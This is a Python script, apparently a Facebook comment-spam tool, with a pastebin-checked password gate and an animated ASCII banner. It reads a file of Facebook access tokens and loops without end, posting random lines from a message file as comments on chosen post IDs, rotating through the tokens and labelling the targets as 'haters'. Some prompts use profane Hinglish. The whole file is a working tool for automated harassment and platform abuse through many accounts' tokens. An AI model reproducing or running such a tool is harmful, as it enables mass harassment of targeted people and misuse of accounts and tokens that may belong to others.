import requests
import os
import sys
import time
import random
from datetime import datetime

# Function for Animated ASCII Art
def animated_logo(logo_text, delay=0.002):
    os.system('clear')  # स्क्रीन क्लियर करें
    for char in logo_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print("\n")

# ASCII Logo (With Animation)
logo = """\x1b[1;36m      
        ███╗   ██╗ █████╗ ██████╗ ██████╗ ███╗   ███╗     █████╗  ██████╗ 
        ████╗  ██║██╔══██╗██╔══██╗╚════██╗████╗ ████║    ██╔══██╗██╔════╝ 
        ██╔██╗ ██║███████║██║  ██║ █████╔╝██╔████╔██║    ███████║██║  ███╗
        ██║╚██╗██║██╔══██║██║  ██║ ╚═══██╗██║╚██╔╝██║    ██╔══██║██║   ██║
        ██║ ╚████║██║  ██║██████╔╝██████╔╝██║ ╚═╝ ██║    ██║  ██║╚██████╔╝
        ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝  
"""

animated_logo(logo, delay=0.002)  # Animated Logo

print("\033[92mSTART TIME :", time.strftime("%Y-%m-%d %H:%M:%S"))  

# Login System
def pas():
    print('\u001b[37m' + '\x1b[1;32m<<━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>>')
    password = input("\033[1;32m𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗➜  ") 
    print('\x1b[1;32m<<━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>>')
    mmm = requests.get('https://pastebin.com/raw/8pEpSkpa').text

    if mmm not in password:
        print('\033[1;33m𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗➜ ')
        sys.exit()
        
pas()

# Prompt for token file
token_file = input("\033[1;30m𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡 𝗙𝗜𝗟𝗘 𝗣𝗔𝗧𝗛 ➜ ")
print('\x1b[1;32m<<━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>>')

# Read access token IDs from file
with open(token_file, 'r') as f:
    access_tokens = f.read().splitlines()

# Prompt for the number of user IDs
num_user_ids = int(input("\033[1;32m𝗕𝗦𝗗𝗞 𝗞𝗜𝗧𝗡𝗜 𝗣𝗢𝗦𝗧 𝗣𝗘 𝗧𝗢𝗢𝗟𝗦 𝗟𝗚𝗔𝗡𝗔 𝗖𝗛𝗔𝗛𝗜𝗧𝗘𝗡 𝗛𝗢 𝗪𝗢 𝗗𝗔𝗟𝗜 ➜ "))
print('\x1b[1;32m<<━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>>')

user_messages = {}
haters_name = {} 

# Prompt for user IDs and message files
for i in range(num_user_ids):
    user_id = input(f"\033[1;32m𝗘𝗡𝗧𝗘𝗥 𝗣0𝗦𝗧 𝗜𝗗 𝗡𝗨𝗠𝗕𝗘𝗥➜ ")
    hater_name = input(f"\033[1;32m𝗘𝗡𝗧𝗘𝗥 𝗛𝗔𝗧𝗘𝗥𝗦 𝗡𝗔𝗠𝗘➜ ")
    message_file = input(f"\033[1;32m𝗘𝗡𝗧𝗘𝗥 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗜𝗟𝗘➜  ")
    
    haters_name[user_id] = hater_name
    user_messages[user_id] = message_file

# Prompt for delay time in messages
delay_time = int(input("\033[1;32m𝗘𝗡𝗧𝗘𝗥 𝗗𝗘𝗟𝗔𝗬 /𝗧𝗜𝗠𝗘 (in seconds) ➜ "))
repeat_delay = int(input("\033[1;32m𝗘𝗡𝗧𝗘𝗥 𝗥𝗘𝗣𝗘𝗔𝗧 𝗧𝗜𝗠𝗘 (in seconds) ➜ "))

# Function to send messages
def send_message(user_id, message, token):
    url = f"https://graph.facebook.com/{user_id}/comments"
    payload = {"message": message, "access_token": token}
    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print(f"\033[1;32m[✔] Successfully commented on {user_id}")
    else:
        print(f"\033[1;31m[✖] Failed to comment on {user_id}: {response.text}")

# Start commenting process
print("\033[1;34m[🔄] Starting Commenting Process...")

for user_id, message_file in user_messages.items():
    try:
        with open(message_file, 'r') as mf:
            messages = mf.readlines()
    except FileNotFoundError:
        print(f"\033[1;31m[✖] Error: File {message_file} not found!")
        continue

    while True:
        for token in access_tokens:
            message = random.choice(messages).strip()
            send_message(user_id, message, token)
            time.sleep(delay_time)

        print(f"\033[1;33m[🔄] Waiting {repeat_delay} seconds before repeating...")
        time.sleep(repeat_delay)
